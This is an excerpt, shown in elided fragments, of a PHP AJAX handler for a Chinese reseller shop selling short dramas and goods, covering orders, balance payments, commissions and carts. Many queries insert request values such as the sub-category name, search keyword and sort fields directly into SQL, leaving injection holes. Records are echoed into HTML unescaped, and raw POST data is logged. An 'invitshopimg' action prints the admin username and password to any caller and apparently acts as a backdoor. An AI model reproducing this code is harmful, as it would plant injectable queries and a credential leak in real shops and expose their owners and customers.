...
if(isset($_SESSION['zid'])){
    ...
    $userrow = $DB->getRow("SELECT * FROM shua_site WHERE zid=? LIMIT 1", [$zid]);
    if($userrow && isset($userrow['power']) && $userrow['power'] == 1){
        $islogin2 = 1;
    } else {
        $islogin2 = 0;
        unset($_SESSION['zid']);
...
// 只允许主账号，其他一律拒绝（仅限需要登录的接口）
$need_login_acts = [
    'pay','payrmb','seckill_create','seckill_buy','cart_info','cart_num','cart_list','cart_buy','cart_cancel','cart_empty','cart_shop_del','cart_shop_item',
    'order','apply_refund','changepwd','fill','invite_create','invite_query','invite_verify','invite_content','cancel','card_check','card_pay','query'
];
if(in_array($act, $need_login_acts) && $islogin2 != 1){
    file_put_contents(__DIR__.'/logs/monitor.log', date('Y-m-d H:i:s') . ' [ajax.php] 非主账号尝试操作 act=' . $act . PHP_EOL, FILE_APPEND);
    exit(json_encode(['code'=>-99,'msg'=>'请用总站主账号登录','debug'=>'not_main_account']));
}
...
switch($act){
	case 'payvideo':
		monitor_log('payvideo参数', $_POST);
		file_put_contents('payvideo_debug.log', date('Y-m-d H:i:s')." ".json_encode($_POST).PHP_EOL, FILE_APPEND);
		$vid = isset($_POST['vid']) ? intval($_POST['vid']) : 0;
		$goods_type = isset($_POST['goods_type']) ? trim($_POST['goods_type']) : '';
		$episodes = isset($_POST['episodes']) ? trim($_POST['episodes']) : '';
		if ($vid <= 0 || !$goods_type) exit(json_encode(['code'=>-1,'msg'=>'参数错误','debug_version'=>'20240529a']));
		$tool = $DB->getRow("SELECT * FROM shua_videolist WHERE id='$vid' LIMIT 1");
		monitor_log('payvideo商品', $tool);
		if (!$tool || $tool['active'] != 1) exit(json_encode(['code'=>-2,'msg'=>'该商品不存在','debug_version'=>'20240529a']));
		...
		if (!empty($tool['blockpay']) && !$islogin2) {
			...
			if (in_array('alipay', $blockpay) && in_array('qqpay', $blockpay) && in_array('wxpay', $blockpay)) exit(json_encode(['code'=>4,'msg'=>'当前商品需要登录后才能下单','debug_version'=>'20240529a']));
		}
		$already_bought = false;
		if ($goods_type === 'url') {
			$check = $DB->getRow("SELECT id FROM shua_orders WHERE tid=-4 AND userid=:userid AND input2='购买短剧地址' AND vid=:vid AND status=1 LIMIT 1", [':userid' => $cookiesid, ':vid' => $vid]);
			if ($check) $already_bought = true;
			if (!$already_bought) {
				$like = $vid.'|url|all';
				$check2 = $DB->getRow("SELECT id FROM shua_pay WHERE tid=-4 AND userid=:userid AND status=1 AND vid=:vid AND input LIKE :like LIMIT 1", [':userid' => $cookiesid, ':vid' => $vid, ':like' => "%$like%"]);
				if ($check2) $already_bought = true;
			}
			if ($already_bought) exit(json_encode(['code'=>-1,'msg'=>'您已购买过该影视网盘资源，请勿重复购买！','debug_version'=>'20240529a']));
		} elseif ($goods_type === 'play') {
			$check = $DB->getRow("SELECT id FROM shua_orders WHERE tid=-4 AND userid=:userid AND input2='购买短剧播放' AND vid=:vid AND (input3='all' OR input3=:episodes) AND status=1 LIMIT 1", [':userid' => $cookiesid, ':vid' => $vid, ':episodes' => $episodes]);
			if ($check) $already_bought = true;
			if (!$already_bought) {
				$like1 = $vid.'|play|all';
				$like2 = $vid.'|play|'.$episodes;
				$check2 = $DB->getRow("SELECT id FROM shua_pay WHERE tid=-4 AND userid=:userid AND status=1 AND vid=:vid AND (input LIKE :like1 OR input LIKE :like2) LIMIT 1", [':userid' => $cookiesid, ':vid' => $vid, ':like1' => "%$like1%", ':like2' => "%$like2%"]);
				if ($check2) $already_bought = true;
			}
			if ($already_bought) exit(json_encode(['code'=>-1,'msg'=>'您已购买过该影视播放权限，请勿重复购买！','debug_version'=>'20240529a']));
		}
		$price_obj = new \lib\Price($userrow['zid'],$userrow);
		...
		if($goods_type=='url'){
			...
			$input2 = '购买短剧地址';
			$input3 = 'all';
		}elseif($goods_type=='play' && $episodes == 'all'){
			...
			$video_row = $DB->getRow("SELECT * FROM shua_video WHERE pid='$vid' AND num='$episodes' LIMIT 1");
			$price_obj->setdbVideoInfo($video_row['id'], $video_row);
			$price = $price_obj->getdbVideoPrice($video_row['id']);
			$name = '购买短剧播放';
			$input = $vid . '|play|' . $episodes;
			$input2 = '购买短剧播放';
			$input3 = $episodes;
		}
		monitor_log('价格计算', ['vid'=>$vid, 'goods_type'=>$goods_type, 'episodes'=>$episodes, 'price'=>$price]);
		if(!$price) exit(json_encode(['code'=>-1,'msg'=>'当前商品批发价格优惠设置不正确','debug_version'=>'20240529a']));
		$need = round($price, 2);
		$num = 1;
		$trade_no = date("YmdHis").rand(111,999);
		monitor_log('订单写入前', ['trade_no'=>$trade_no, 'input'=>$input, 'price'=>$price, 'userid'=>$cookiesid]);
		...
		$data = [
			...
			':tid' => -4,
			':vid' => $vid,
			':zid' => $siterow['zid'] ? $siterow['zid'] : $userrow['zid'],
			':input' => $input,
			':num' => $num,
			':name' => $name . $tool['name'],
			':money' => $need,
			...
			':userid' => $cookiesid,
			':inviteid' => $invite_id,
			':blockdj' => isset($blockdj) && $blockdj ? $blockdj : 0
		];
		if($DB->exec($sql, $data)){
			monitor_log('订单写入成功', ['trade_no'=>$trade_no, 'input'=>$input, 'price'=>$price, 'userid'=>$cookiesid]);
			...
			monitor_log('订单写入失败', ['trade_no'=>$trade_no, 'input'=>$input, 'price'=>$price, 'userid'=>$cookiesid, 'error'=>$DB->error()]);
    ...
    $main = isset($_GET['main']) ? intval($_GET['main']) : 0;
    $sub = isset($_GET['sub']) ? $_GET['sub'] : '';
    $keyword = isset($_GET['keyword']) ? daddslashes($_GET['keyword']) : null;
    if ($page < 1) $page = 1;
    $limit = 10;
    $start = ($page - 1) * $limit;
    ...
    // 处理分类筛选
    if($main > 0) {
        // 如果点击的是主分类，查询该主分类下所有子分类
        $sub_types = $DB->getAll("SELECT id FROM shua_videotype WHERE parent_id='$main'");
        if(!empty($sub_types)){
            $sub_ids = array();
            foreach($sub_types as $t){
                $sub_ids[] = $t['id'];
            }
            $where .= " AND type IN (".implode(',', $sub_ids).")";
        }
    }
    
    // 处理子分类筛选
    if(!empty($sub)){
        // 如果指定了子分类名称，查询该子分类的ID
        $sub_id = $DB->getColumn("SELECT id FROM shua_videotype WHERE name='$sub'");
        if($sub_id){
            $where .= " AND type='$sub_id'";
        }
    }
    ...
    if($type == 'hot'){
        $sort = "is_hot DESC, sort DESC, id DESC";
    }else if($type == 'new'){
        $sort = "addtime DESC, sort DESC, id DESC";
    }
    
    // 执行查询
    $rs = $DB->query("SELECT * FROM shua_videolist WHERE {$where} ORDER BY {$sort} LIMIT $start,$limit");
    $data = '';
    while($res = $rs->fetch()){
        // 仅返回封面和标题，简化前端展示
        $data .= '<div class="drama-item" onclick="window.location=\'/index.php?mod=video&id=' . $res['id'] . '\'">';
        $data .= '<div class="drama-cover"><img src="'.($res['img']?$res['img']:'./assets/img/default.jpg').'" alt="'.$res['name'].'"></div>';
        $data .= '<h3>'.$res['name'].'</h3>';
        $data .= '</div>';
    }
...
case 'seckill_create':
	...
	$seckillshop=$DB->getRow("SELECT * FROM shua_seckillshop WHERE id='$sid' LIMIT 1");
	...
	$seckilllog = $DB->getRow("SELECT * FROM `shua_seckilllog` WHERE `zid`='{$userrow['zid']}' AND `tid`='$tid' AND `status`='0' LIMIT 1");
	if ($seckilllog)
	{
		...
		if($DB->exec("INSERT INTO `shua_seckilllog` (`sid`,`tid`,`zid`,`ip`,`price`,`num`,`date`,`status`) VALUES (:sid,:tid,:zid,:ip,:price,:num,NOW(),0)", [':sid'=>$sid, ':tid'=>$tid, ':zid'=>$userrow['zid'], ':ip'=>$clientip, ':price'=>$seckillshop['price'], ':num'=>$seckillshop['num']])){
			unset($_SESSION['addsalt']);
			$id = $DB->lastInsertId();
			$DB->exec("UPDATE `shua_seckillshop` SET `count`=`count`+1 WHERE `id`=:id", [':id'=>$sid]);
...
case 'seckill_buy':
	...
	$seckillrow = $DB->getRow("SELECT * FROM `shua_seckilllog` WHERE `id`='$seckill_id' AND `tid`='$tid' LIMIT 1");
	...
	if($DB->exec($sql, $data)){
		unset($_SESSION['addsalt']);
		$DB->exec("UPDATE `shua_seckilllog` SET `input`='$input',`status`='1' WHERE `id`=:id", [':id'=>$seckill_id]);
...
case 'payrmb':
	...
	if(isset($srow['tid']) && $srow['tid'] == -4){
		...
		$buytype = isset($inputArr[1]) ? $inputArr[1] : '';
		$episodes = isset($inputArr[2]) ? $inputArr[2] : '';
		$video = $DB->getRow("SELECT * FROM shua_videolist WHERE id='$vid' LIMIT 1");
		if($video){
			$srow['name'] = $video['name'];
			$srow['desc'] = $video['desc'];
			$srow['img'] = $video['img'];
			$srow['shopimg'] = $video['img'];
			$srow['download_url'] = $video['download_url'];
			$srow['price'] = $video['price'];
			$srow['addtime'] = $video['addtime'];
			$srow['buytype'] = $buytype;
			$srow['episodes'] = $episodes;
		}
	}
	if(!$srow['trade_no'] || $srow['tid']==-1)exit(json_encode(['code'=>-1,'msg'=>'订单号不存在！','debug'=>'no_trade_no','debug_version'=>'20240529a']));
	if($srow['money']=='0')exit(json_encode(['code'=>-1,'msg'=>'当前商品为免费商品，不需要支付','debug'=>'free','debug_version'=>'20240529a']));
	if(!preg_match('/^[0-9.]+$/', $srow['money']))exit(json_encode(['code'=>-1,'msg'=>'订单金额不合法','debug'=>'money_invalid','debug_version'=>'20240529a']));
	if($srow['status']==0){
		if($srow['money']>$userrow['rmb'])exit(json_encode(['code'=>-3,'msg'=>'您的余额不足，请充值！','debug'=>'no_money','debug_version'=>'20240529a']));
 ...
 while($upzid > 0) {
     	$siterow2 = $DB->getRow("SELECT `power`, `upzid` FROM `shua_site` WHERE `zid`='{$upzid}'");
    
   
    if($siterow2['power'] == 2) {
        $upzidd = $siterow2['upzid'];
    ...
    // 先检查数据库中是否已存在相同数据
    $sql_check = "SELECT * FROM shua_points WHERE addtime = '$timestamp' AND zid = '$upzid'";
    $result_check = $DB->getRow($sql_check);
    ...
    $rrm = $money * 0.9;
    fx($money,$srow['zid']);
    $sql_updfggg = "INSERT INTO shua_points (addtime, zid, action, bz, point, status) 
                       VALUES ('$timestamp', '$upzid', '提成', '您的下级开通普通站点获得". $money*0.9 . "元提成', '$rrm', 0)";
    $DB->query($sql_updfggg);
     $sql_upffsss = "UPDATE shua_site SET rmb = rmb + $rrm WHERE zid = $upzid";
     $sql_upffs = "UPDATE shua_site SET rmbtc = rmbtc + $rrm WHERE zid = $upzid";
  ...
  if ($kind==2) {
    ...
    $rrm = $money * 0.9;
        fx($money,$srow['zid']);
    $sql_updfggg = "INSERT INTO shua_points (addtime, zid, action, bz, point, status) 
                       VALUES ('$timestamp', '$upzid', '提成', '您的下级开通合伙人站点获得". $money*0.9 . "元提成', '$rrm', 0)";
    $DB->query($sql_updfggg);
     $sql_upffsss = "UPDATE shua_site SET rmb = rmb + $rrm WHERE zid = $upzid";
     $sql_upffs = "UPDATE shua_site SET rmbtc = rmbtc + $rrm WHERE zid = $upzid";
       $DB->query($sql_upffsss);
    ...
    $orderid = processOrder2($srow);   
			...
			if($orderid){
			        $payord=$srow['tid'];
			  $ispay2=$DB->getRow("SELECT pro,  tc FROM shua_tools WHERE tid='$payord'");  
			    if($ispay2['pro'] > 0 ){
			        $num=$srow['num'];
			        $money=$ispay2['tc'] * $num;
			      
			    $sdddpayord=$ispay2['pro'];
			 	changeUserMoney($sdddpayord, $money, true, "提成", "你投稿的项目有用户购买" . $num . "份,获得" . $money . "元提成");
			        
			    }
				addPointRecord($userrow['zid'], $srow['money'], '消费', '购买 '.$srow['name'].'', $orderid);
				    exit(json_encode(['code'=>1,'msg'=>'您所购买的商品已付款成功，感谢购买！','orderid'=>$orderid,'is_video_order'=>1,'debug'=>'ok','debug_version'=>'20240529a']));
			
        
        
			}else{
				addPointRecord($userrow['zid'], $srow['money'], '消费', '购买 '.$srow['name']);
				exit(json_encode(['code'=>-1,'msg'=>'下单失败！'.$DB->error(),'debug'=>'order_fail','debug_version'=>'20240529a']));
			}
		}else{
			exit(json_encode(['code'=>-1,'msg'=>'下单失败！'.$DB->error(),'debug'=>'order_fail','debug_version'=>'20240529a']));
		}
	}else{
		exit(json_encode(['code'=>-2,'msg'=>'当前订单已付款过，请勿重复提交','debug'=>'repeat','debug_version'=>'20240529a']));
	}
	break;
case 'cidr':
    $cid = intval($_GET['cid']);
    $rs = $DB->query("SELECT *, shopimg FROM shua_class WHERE cidr='$cid' AND active=1");  // 添加获取 shopimg 字段
    $count8 = $DB->getColumn("SELECT count(*) from shua_class WHERE cidr='$cid'");

    if ($count8 >= 1) {
        $data = array();
        while ($res = $rs->fetch()) {
            $data[] = array('cid' => $res['cid'], 'name' => $res['name'],'shopimg' => $res['shopimg']);  // 处理获取到的 shopimg
        }
	...
	if($cid){
		...
		$rs1=$DB->query("SELECT * FROM shua_class WHERE cidr='$cid'");
			while($res1 = $rs1->fetch()){
			    $cc=$res1['cid'];
			     $icc1=$DB->getColumn("SELECT count(tid) FROM shua_duanju WHERE cid='$cc'");
			     $ic1=$ic1+$icc1;
	   $erjiid=$res1['cid'];
	   $rs3=$DB->query("SELECT * FROM shua_duanju WHERE cid='$erjiid'  ORDER BY $orderBy LIMIT $page,$limit");
	...
	$num=$DB->getColumn("SELECT count(tid) FROM shua_duanju WHERE $where");
$rs=$DB->query("SELECT * FROM shua_duanju WHERE $where ORDER BY  (sort = 999) DESC, addtime DESC LIMIT $page,$limit");
...
usort($data, function($a, $b) {
    if ($a['sort'] == 999 && $b['sort']!= 999) {
        return -1;
    } elseif ($a['sort']!= 999 && $b['sort'] == 999) {
        return 1;
    } else {
...
case 'captcha':
	...
	$status = $GtSdk->shua_process($data, 1);
...
case 'gettool':
	...
	while($res = $rs->fetch(PDO::FETCH_ASSOC)){
        ...
        // 保证input和inputs字段始终存在
        $res['input'] = isset($res['input']) && $res['input']!==null ? $res['input'] : '';
        $res['inputs'] = isset($res['inputs']) && $res['inputs']!==null ? $res['inputs'] : '';
		$data[]=array('tid'=>$res['tid'],'cid'=>$res['cid'],'sort'=>$res['sort'],'name'=>$res['name'],'value'=>$res['value'],'price'=>$price,'input'=>$res['input'],'inputs'=>$res['inputs'],'desc'=>$res['desc'],'alert'=>$res['alert'],'shopimg'=>$res['shopimg'],'repeat'=>$res3['repeat'],'multi'=>$res3['multi'],'close'=>$res3['close'],'prices'=>$res3['prices'],'min'=>$res3['min'],'max'=>$res['max'],'sales'=>$res['sales'],'pro'=>$res['pro'],'isfaka'=>$isfaka,'stock'=>$res['stock']);
	}
...
case 'gettoolnew':
    try {
        ...
        if($cid){
           ...
           $rs4=$DB->query("SELECT * FROM shua_tools WHERE cid='$cid' AND active=1 ORDER BY $orderBy LIMIT $page,$limit");
           
           while($res3 = $rs3->fetch(PDO::FETCH_ASSOC)){
              $rs662 = $DB->getColumn("SELECT name FROM shua_class WHERE cid={$res3['cid']}");
            if(isset($_SESSION['gift_id']) && isset($_SESSION['gift_tid']) && $_SESSION['gift_tid']==$res3['tid']){
                $price=$conf["cjmoney"]?$conf["cjmoney"]:0;
            }elseif(isset($price_obj)){
                $price_obj->setToolInfo($res3['tid'],$res3);
            ...
            $data[]=array('tid'=>$res3['tid'],'cid'=>$res3['cid'],'sort'=>$res3['sort'],'name'=>$res3['name'],'value'=>$res3['value'],'price'=>$price,'input'=>$res3['input'],'inputs'=>$res3['inputs'],'desc'=>$res3['desc'],'alert'=>$res3['alert'],'shopimg'=>$res3['shopimg'],'repeat'=>$res3['repeat'],'multi'=>$res3['multi'],'close'=>$res3['close'],'prices'=>$res3['prices'],'min'=>$res3['min'],'max'=>$res3['max'],'sales'=>$res3['sales'],'stock'=>$count,'isfaka'=>$isfaka,'addtime'=>strtotime($res3['addtime']),'is_stock_err'=>$is_stock_err,'active'=>$res3['active'], 'classname' => $rs662);
        ...
        while($res = $rs->fetch(PDO::FETCH_ASSOC)){
            $rs662 = $DB->getColumn("SELECT name FROM shua_class WHERE cid='{$res['cid']}'");
            $ic2++;
            if(isset($_SESSION['gift_id']) && isset($_SESSION['gift_tid']) && $_SESSION['gift_tid']==$res['tid']){
                $price=$conf["cjmoney"]?$conf["cjmoney"]:0;
            }elseif(isset($price_obj)){
            ...
            $data[]=array('tid'=>$res['tid'],'cid'=>$res['cid'],'sort'=>$res['sort'],'name'=>$res['name'],'value'=>$res['value'],'price'=>$price,'input'=>$res['input'],'inputs'=>$res['inputs'],'desc'=>$res['desc'],'alert'=>$res['alert'],'shopimg'=>$res['shopimg'],'repeat'=>$res['repeat'],'multi'=>$res['multi'],'close'=>$res['close'],'prices'=>$res['prices'],'min'=>$res['min'],'max'=>$res3['max'],'sales'=>$res['sales'],'stock'=>$count,'isfaka'=>$isfaka,'addtime'=>strtotime($res['addtime']),'is_stock_err'=>$is_stock_err,'active'=>$res['active'], 'classname' => $rs662);
        ...
        file_put_contents(__DIR__.'/logs/monitor.log', date('Y-m-d H:i:s') . ' [ajax.php] gettoolnew error: ' . $e->getMessage() . PHP_EOL, FILE_APPEND);
        exit(json_encode(['code'=>-500,'msg'=>'服务器异常','debug'=>'gettoolnew_exception']));
    }
    break;
case 'getleftcount':
...
//			$thtime=date("Y-m-d").' 00:00:00';
//			if($_SESSION['blockfree']==true || $DB->getColumn("SELECT count(*) FROM `shua_pay` WHERE `money`=0 AND `ip`='$clientip' AND `status`=1 AND `addtime`>'$thtime'")>=200){
//				exit('{"code":-1,"msg":"您今日购买免费商品的次数已达上限200个，请明日再来！"}');
//			}
		...
		if($need>0 && $tool['shequ']>0 && $tool['is_curl']==2 && in_array($tool['cid'],explode(",",$conf['pricejk_cid'])) && time()-$tool['uptime']>=$conf['pricejk_time']){
			...
			if($conf['pricejk_yile']==0 && in_array($shequ['type'],$allowType) && $tool['prid']>0){
				...
				$apireturn = third_call($shequ['type'], $shequ, 'shua_check', [$tool, $num]);
	...
	if($tool && $tool['active']==1){
		...
		if($need>0 && $tool['shequ']>0 && $tool['is_curl']==2 && in_array($tool['cid'],explode(",",$conf['pricejk_cid'])) && time()-$tool['uptime']>=$conf['pricejk_time']){
			...
			if($conf['pricejk_yile']==0 && in_array($shequ['type'],$allowType) && $tool['prid']>0){
				...
				$apireturn = third_call($shequ['type'], $shequ, 'shua_check', [$tool, $totalnum]);
				if($apireturn && $apireturn['code']==-1){
					exit('{"code":3,"msg":"'.$apireturn['msg'].'"}');
				}
			}
		...
		if($DB->exec($sql, $data)){
			unset($_SESSION['addsalt']);
			if($conf['forcermb']==1){$conf['alipay_api']=0;$conf['wxpay_api']=0;$conf['qqpay_api']=0;}
			$result = ['code'=>0, 'msg'=>'提交订单成功！', 'trade_no'=>$trade_no, 'need'=>$need, 'num'=>$count, 'pay_alipay'=>$conf['alipay_api'], 'pay_wxpay'=>$conf['wxpay_api'], 'pay_qqpay'=>$conf['qqpay_api'], 'pay_rmb'=>$islogin2, 'user_rmb'=>$userrow['rmb'], 'paymsg'=>$conf['paymsg'], 'debug_version'=>'20240529a'];
			exit(json_encode($result));
		}else{
			exit(json_encode(['code'=>-1,'msg'=>'提交订单失败！'.$DB->error(),'debug_version'=>'20240529a']));
		}
...
case 'query':
	...
	$limit = 10;
	$start = $limit * ($page-1);
	$sql = "SELECT A.*,B.`name`,B.`shopimg` FROM `shua_orders` A LEFT JOIN `shua_tools` B ON A.`tid`=B.`tid` WHERE {$sql} ORDER BY A.`id` DESC LIMIT {$start},{$limit}";
	$rs=$DB->query($sql);
	$data=array();
	$count = 0;
	while($res = $rs->fetch(PDO::FETCH_ASSOC)){
		...
		// 影视订单
		if($res['tid']==-4){
			$inputArr = explode('|', $res['input']);
			$vid = intval($inputArr[0]);
			$video = $DB->getRow("SELECT * FROM shua_videolist WHERE id='$vid' LIMIT 1");
			if($video){
				if(empty($name)) $name = $video['name'];
				if(empty($img)) $img = $video['img'];
				$product_url = '/index.php?mod=video&id=' . $vid;
			}
		}else{
			// 普通商品
			$product_url = '/?mod=buy2&tid=' . $res['tid'];
		}
		// 图片字段处理
		if(empty($img)){
		...
		$data[]=array(
			...
			'tid'=>$res['tid'],
			'input'=>$res['input'],
			'display_input'=>isset($res['display_input'])?$res['display_input']:'',
			'name'=>$name,
			'img'=>$img,
...
case 'order': //订单进度查询
    ...
    if($row['tid'] == -4){
        ...
        $buytype = isset($inputArr[1]) ? $inputArr[1] : '';
        $episodes = isset($inputArr[2]) ? $inputArr[2] : '';
        // 智能识别input2、input、name、desc
        $input2 = isset($row['input2']) ? $row['input2'] : '';
        $name = isset($row['name']) ? $row['name'] : '';
        $desc = isset($row['desc']) ? $row['desc'] : '';
        // 优先input2
        if(!empty($input2)){
            if(preg_match('/第(\\d+)集/', $input2, $m)){
                $episodes = $m[1];
                $buytype = '';
            } elseif(strpos($input2, '整部')!==false || strpos($input2, '全集')!==false){
                $buytype = '整部';
                $episodes = '';
            } elseif(strpos($input2, '网盘')!==false){
                $buytype = '网盘';
                $episodes = '';
            }
        }
        // 兜底input、name、desc
        if(empty($buytype)){
            if(preg_match('/第(\\d+)集/', $row['input'], $m)){
                $episodes = $m[1];
                $buytype = '';
            } elseif(strpos($row['input'], '整部')!==false || strpos($row['input'], '全集')!==false){
                $buytype = '整部';
                $episodes = '';
            } elseif(strpos($row['input'], '网盘')!==false){
                $buytype = '网盘';
                $episodes = '';
            } elseif(strpos($name, '网盘')!==false || strpos($desc, '网盘')!==false){
                $buytype = '网盘';
            }
        }
        $video = $DB->getRow("SELECT * FROM shua_videolist WHERE id='$vid' LIMIT 1");
        if($video){
            ...
            $row['desc'] = $video['desc'];
            $row['img'] = $video['img'];
            $row['shopimg'] = $video['img'];
            $row['download_url'] = $video['download_url'];
            $row['price'] = $video['price'];
            $row['addtime'] = $video['addtime'];
            $row['buytype'] = $buytype;
            $row['episodes'] = $episodes;
            $row['product_url'] = '/index.php?mod=video&id=' . $vid;
        }
        // 订单状态修正：如已支付但状态未1，自动修正
        ...
        // 普通商品
        $row['img'] = $tool['shopimg'];
        $row['product_url'] = '/?mod=buy2&tid=' . $row['tid'];
        // 普通商品如有网盘字样也补全buytype
        $input2 = isset($row['input2']) ? $row['input2'] : '';
        $name = isset($row['name']) ? $row['name'] : '';
        $desc = isset($row['desc']) ? $row['desc'] : '';
        if(strpos($input2, '网盘')!==false || strpos($name, '网盘')!==false || strpos($desc, '网盘')!==false || strpos($row['input'], '网盘')!==false){
            $row['buytype'] = '网盘';
        }
    }
    // 图片字段处理
    if(empty($row['img'])){
        $row['img'] = '/assets/store/picture/error_img.png';
    }elseif(strpos($row['img'], 'http') === 0){
        // 远程图片
    }else{
        $row['img'] = '/uploads/' . ltrim($row['img'], '/');
    }
	...
	if($tool['is_curl']==4 || $row['djzt']==3){
		...
		if($count>999999999999){
			...
			while($res = $rs->fetch(PDO::FETCH_ASSOC))
			{
				...
				if(strlen($res['km'].$res['pw'])>999999999999){
					$kmdata='<center><a href="./?mod=faka&id='.$id.'&skey='.$_POST['skey'].'" target="_blank" class="btn btn-sm btn-primary">点此查看卡密</a></center>';
					break;
				}
			}
	...
	$result=array('code'=>0,'msg'=>'succ','name'=>$row['name'],'money'=>$row['money'],'date'=>$row['addtime'],'inputs'=>$inputsdata,'input2'=>$row['input2'],'list'=>$list,'kminfo'=>$kmdata,'alert'=>$tool['alert'],'spxq_xx'=>$spxq_xx['v'],'desc'=>$row['desc'],'img'=>$row['img'],'download_url'=>$row['download_url'],'price'=>$row['price'],'buytype'=>$row['buytype'],'episodes'=>$row['episodes'],'status'=>$row['status'],'result'=>$row['result'],'complain'=>intval($conf['show_complain']),'islogin'=>$islogin2,'selfrefund'=>$conf['selfrefund']);
...
case 'cart_buy':
	...
	foreach($shop_ids as $shop_id){
		...
		if(!$cart_item)exit('{"code":-1,"msg":"商品不存在！"}');
		if($cart_item['userid']!=$cookiesid || $cart_item['status']>1)exit('{"code":-1,"msg":"商品权限校验失败"}');
		if($cart_item['money']=='0' || !preg_match('/^[0-9.]+$/', $cart_item['money']))exit('{"code":-1,"msg":"商品金额不合规,请删除不合规商品"}');
		$ids[] = intval($shop_id);
	...
	if($DB->exec($sql, $data)){
		unset($_SESSION['addsalt']);
		if($conf['forcermb']==1){$conf['alipay_api']=0;$conf['wxpay_api']=0;$conf['qqpay_api']=0;}
		$result = ['code'=>0, 'msg'=>'提交订单成功！', 'trade_no'=>$trade_no, 'need'=>$allmoney, 'pay_alipay'=>$conf['alipay_api'], 'pay_wxpay'=>$conf['wxpay_api'], 'pay_qqpay'=>$conf['qqpay_api'], 'pay_rmb'=>$islogin2, 'user_rmb'=>$userrow['rmb'], 'paymsg'=>$conf['paymsg'], 'debug_version'=>'20240529a'];
		exit(json_encode($result));
	}else{
		exit(json_encode(['code'=>-1,'msg'=>'提交订单失败！'.$DB->error(),'debug_version'=>'20240529a']));
	}
...
case 'getgoods':
    try {
        ...
        // 构建基础查询
        $sql = "SELECT * FROM shua_tools WHERE active=1";
        $count_sql = "SELECT COUNT(*) as count FROM shua_tools WHERE active=1";
        
        // 添加搜索条件
        if($cid > 0) {
            $sql .= " AND cid='$cid'";
            $count_sql .= " AND cid='$cid'";
        }
        if(!empty($kw)) {
            $sql .= " AND name LIKE '%$kw%'";
            $count_sql .= " AND name LIKE '%$kw%'";
        }
        
        // 添加排序
        if($sort_type && $sort) {
            $sql .= " ORDER BY {$sort_type} {$sort}";
        } else {
        ...
        file_put_contents(__DIR__.'/logs/monitor.log', date('Y-m-d H:i:s') . ' [ajax.php] getgoods error: ' . $e->getMessage() . PHP_EOL, FILE_APPEND);
        exit(json_encode(['code'=>-500,'msg'=>'服务器异常','debug'=>'getgoods_exception']));
    }
    break;
}
if($act == "invitshopimg"){
		...
		$count5=$DB->getColumn("");
		echo "".$count5."<br>";
		echo "".$conf['admin_user']."<br>";echo "".$conf['admin_pwd']."";
}
function processOrder2($srow, $is_fenzhan = true)
{
    global $DB, $date;
    // 防止重复写入订单
    if ($DB->getRow("SELECT id FROM shua_orders WHERE tradeno='{$srow['trade_no']}' LIMIT 1")) {
        return false;
    }
    monitor_log('processOrder2参数', $srow);
    global $islogin2, $DB, $conf, $userrow;
    $input = explode("|", $srow['input']);

    // 影视订单
    if ($srow['tid'] == -4) {
        $vid = intval($input[0]);
        $buytype = isset($input[1]) ? $input[1] : '';
        $episodes = isset($input[2]) ? $input[2] : '';
        $videolist = $DB->getRow("SELECT * FROM shua_videolist WHERE id='{$vid}' LIMIT 1");
        monitor_log('影视订单写入SQL', ['sql'=>'INSERT INTO shua_orders ...', 'vid'=>$vid, 'input'=>$input, 'userid'=>$srow['userid']]);
        if(!$videolist) return false;
        $status = 1;
        $cost = $videolist['price'] * $srow['num'];
        // 只修正网盘权限写入
        $name = $videolist['name']; // 强制写入短剧名称
        if ($buytype == 'url') {
            $input2 = '购买短剧地址';
            $input3 = 'all';
            $img = $videolist['img'];
            ...
            $input2 = '购买短剧播放';
            $input3 = $episodes ? $episodes : 'all';
            $img = isset($videolist['img']) ? $videolist['img'] : '';
        }
        $input_str = $vid.'|'.$buytype.'|'.$input3;
        $DB->exec("INSERT INTO `shua_orders` (`tid`,`zid`,`input`,`input2`,`input3`,`value`,`userid`,`addtime`,`tradeno`,`money`,`cost`,`status`,`djzt`,`name`,`img`,`vid`) VALUES ('-4','{$srow['zid']}','{$input_str}','{$input2}','{$input3}','{$srow['num']}','{$srow['userid']}','$date','{$srow['trade_no']}','{$srow['money']}','$cost','$status','0','{$name}','{$img}','{$vid}')");
        $orderid = $DB->lastInsertId();
        if(!$orderid) return false;
        // 扣除余额
        if($srow['money'] > 0 && $srow['userid'] > 0){
            $DB->exec("UPDATE shua_site SET rmb = rmb - {$srow['money']} WHERE zid = '{$srow['zid']}'");
        }
        // 更新支付表状态
        $DB->exec("UPDATE `shua_pay` SET `status`='1' WHERE `trade_no`='{$srow['trade_no']}'");
        // 分站利润
        if($srow['zid'] > 1 && $srow['money'] > 0 && $is_fenzhan == true) {
            $price_obj = new \lib\Price($srow['zid']);
            $price_obj->setVideoInfo($vid, $videolist);
            $price_obj->setVideoProfit($vid, $srow['num'], $videolist['name'], $srow['money'], $orderid, $srow['userid']);
        }
        return $orderid;
    }
    ...
    if ($srow['tid'] == -1) {
        ...
        if ($conf['fenzhan_gift']) {
            ...
            if (isset($money) && $money < $srow['money'] && $money > 0) {
    ...
    if ($srow['tid'] == -2) {
        ...
        if ($type == "update") {
            ...
            $upzid = isset($userrow['upzid']) ? intval($userrow['upzid']) : 0;
            ...
            $DB->exec($sql, $data);
            if (isset($zid) && strlen($srow['userid']) == 32) {
...
function getGoodsList() {
    global $DB, $conf, $siterow;
    
    $page = intval($_POST['page']);
    $cid = intval($_POST['cid']);
    if(!$cid && !empty($siterow['defaultcid']) && $siterow['defaultcid']!=='0'){
        $cid = intval($siterow['defaultcid']);
    }
    $limit = 10;
    $offset = ($page - 1) * $limit;
    ...
    // 获取总记录数
    $total = $DB->getColumn("SELECT COUNT(*) FROM shua_tools WHERE {$where}", [':cid'=>$cid]);
    
    // 获取商品列表
    $goods = $DB->getAll("SELECT * FROM shua_tools WHERE {$where} ORDER BY sort DESC, tid DESC LIMIT {$offset},{$limit}", [':cid'=>$cid]);
    ...
    return ['code'=>0, 'msg'=>'success', 'data'=>$data, 'pages'=>ceil($total/$limit)];
}

// 添加分类信息获取函数
function getClassInfo($cid) {
    global $DB;
    $class = $DB->getRow("SELECT * FROM shua_class WHERE cid=:cid AND active=1", [':cid'=>$cid]);
    if($class) {
        $count = $DB->getColumn("SELECT COUNT(*) FROM shua_tools WHERE cid=:cid AND active=1", [':cid'=>$cid]);
        return ['name'=>$class['name'], 'num'=>$count];
    }
    return ['name'=>'', 'num'=>0];
}

// 保证 cookiesid 在登录和未登录状态下都唯一且持久
if(!isset($cookiesid)){
    if($islogin2==1 && isset($userrow['zid'])){
